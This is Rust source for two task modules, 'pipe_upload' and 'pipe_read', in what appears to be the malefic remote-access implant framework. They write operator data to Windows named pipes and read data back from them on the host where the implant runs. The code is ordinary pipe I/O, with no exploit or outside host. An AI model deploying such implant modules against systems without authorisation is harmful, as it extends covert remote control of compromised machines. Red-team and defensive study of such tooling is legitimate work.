use futures::SinkExt;
use malefic_helper::win::pipe::PipeClient;
use crate::prelude::*;

pub struct PipeUpload {}

#[async_trait]
#[module_impl("pipe_upload")]
impl Module for PipeUpload {}

#[async_trait]
impl malefic_proto::module::ModuleImpl for PipeUpload {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut malefic_proto::module::Input,
        sender: &mut malefic_proto::module::Output,
    ) -> ModuleResult {
        let request = check_request!(receiver, Body::PipeRequest)?;
        let pipe_name = check_field!(request.name)?;

        let pipe_client = match PipeClient::connect(&pipe_name) {
            Ok(client) => client,
            Err(e) => {
                return Err(e.into());
            },
        };

        if request.data.is_empty() {
            // if data is empty, do nothing
        } else {
            to_error!(pipe_client.write(&request.data))?;
            drop(pipe_client);
            return Ok(TaskResult::new_with_ack(id, 0));
        }

        let _ = sender.send(TaskResult::new_with_ack(id, 0)).await?;

        loop {
            let block = check_request!(receiver, Body::Block)?;

            let data_len = block.content.len();

            if data_len != 0 {
                to_error!(pipe_client.write(&block.content))?;
            }

            if block.end {
                drop(pipe_client);
                return Ok(TaskResult::new_with_ack(id, block.block_id));
            } else {
                let _ = sender
                    .send(TaskResult::new_with_ack(id, block.block_id))
                    .await?;
            }
        }
    }
}

pub struct PipeRead {}

#[async_trait]
#[module_impl("pipe_read")]
impl Module for PipeRead {}

#[async_trait]
impl malefic_proto::module::ModuleImpl for PipeRead {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut malefic_proto::module::Input,
        _sender: &mut malefic_proto::module::Output,
    ) -> ModuleResult {
        let request = check_request!(receiver, Body::PipeRequest)?;
        let pipe_name: String = check_field!(request.name)?;

        let pipe_client = match PipeClient::connect(&*pipe_name) {
            Ok(client) => client,
            Err(e) => {
                debug!("Failed to connect to pipe");
                return Err(e.into());
            },
        };

        let mut buffer = vec![0; 4096];
        let mut total_content = Vec::new();

        loop {
            let bytes_read = to_error!(pipe_client.read(&mut buffer))? as usize;
            if bytes_read == 0 {
                drop(pipe_client);
                break;
            }

            total_content.extend_from_slice(&buffer[..bytes_read]);
        }

        let resp = Response {
            output: String::from_utf8_lossy(&total_content).to_string(),
            error: "".to_string(),
            kv: Default::default(),
            array: vec![],
        };

        Ok(TaskResult::new_with_body(id, Body::Response(resp)))
    }
}


// pub struct PipeClose {}

// #[async_trait]
// #[module_impl("pipe_close")]
// impl Module for PipeClose {
//     async fn run(
//         &mut self,
//         id: u32,
//         receiver: &mut crate::Input,
//         _sender: &mut crate::Output,  // 未使用的sender
//     ) -> Result {
//         let request = check_request!(receiver, Body::PipeRequest)?;
//         let pipe_name: String = check_field!(request.name)?;
//         let pipe = to_error!(NamedPipe::open(&pipe_name))?;
//
//         to_error!(pipe.disconnect())?;
//         pipe.close();
//
//         Ok(TaskResult::new_with_body(id, Body::Empty(implantpb::Empty::default())))
//     }
// }